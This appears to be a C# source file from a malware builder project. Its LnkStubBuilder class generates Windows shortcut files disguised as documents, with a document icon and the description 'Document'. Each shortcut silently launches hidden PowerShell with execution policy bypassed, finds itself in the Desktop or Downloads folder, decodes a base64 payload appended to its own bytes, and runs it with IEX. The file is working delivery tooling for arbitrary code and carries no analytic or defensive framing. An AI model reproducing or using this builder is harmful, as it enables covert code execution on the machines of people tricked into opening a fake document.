using System.IO;
using System.Reflection;
using System.Text;

namespace WpfApp.StubBuilders
{
    internal static class LnkStubBuilder
    {
        public static byte[] Generate(string ps1Code, string iconLocation = "imageres.dll,3")
        {
            byte[] ps1Bytes = Encoding.UTF8.GetBytes(ps1Code);
            string b64Payload = Convert.ToBase64String(ps1Bytes);

            string overlayString = "STUBDATA:" + b64Payload;
            byte[] overlayBytes = Encoding.UTF8.GetBytes(overlayString);

            // One-liner bootstrap: searches Desktop+Downloads for .lnk with STUBDATA, decodes and executes
            string bootstrap =
                "foreach($f in Get-ChildItem -Path \"$env:USERPROFILE\\Desktop\",\"$env:UserPROFILE\\Downloads\" -Filter *.lnk -EA 0 | Sort-Object LastWriteTime -Desc)" +
                "{try{try{$b=[IO.File]::ReadAllBytes($f.FullName)}catch{};if($b){$t=[Text.Encoding]::UTF8.GetString($b);$i=$t.IndexOf('STUBDATA:');" +
                "if($i -ge 0){$d=[Convert]::FromBase64String($t.Substring($i+9));IEX([Text.Encoding]::UTF8.GetString($d));break}}}catch{}}";

            return BuildLnkViaCom(bootstrap, overlayBytes, iconLocation);
        }

        internal static byte[] BuildLnkViaCom(string bootstrap, byte[] overlay, string iconLocation = "imageres.dll,3")
        {
            string tempLnk = Path.Combine(Path.GetTempPath(), "stub_" + Guid.NewGuid().ToString("N") + ".lnk");

            // Create LNK via WScript.Shell COM
            Type shellType = Type.GetTypeFromProgID("WScript.Shell");
            object shell = Activator.CreateInstance(shellType);
            dynamic sc = shell.GetType().InvokeMember("CreateShortcut", BindingFlags.InvokeMethod, null, shell, new object[] { tempLnk });
            sc.TargetPath = "powershell.exe";
            sc.Arguments = "-ep bypass -nop -w hidden -Command " + bootstrap;
            sc.IconLocation = iconLocation;
            sc.Description = "Document";
            sc.WindowStyle = 7;
            sc.Save();

            // Read the LNK binary, append overlay
            byte[] lnkData = File.ReadAllBytes(tempLnk);
            File.Delete(tempLnk);

            byte[] result = new byte[lnkData.Length + overlay.Length];
            Buffer.BlockCopy(lnkData, 0, result, 0, lnkData.Length);
            Buffer.BlockCopy(overlay, 0, result, lnkData.Length, overlay.Length);

            return result;
        }
    }
}
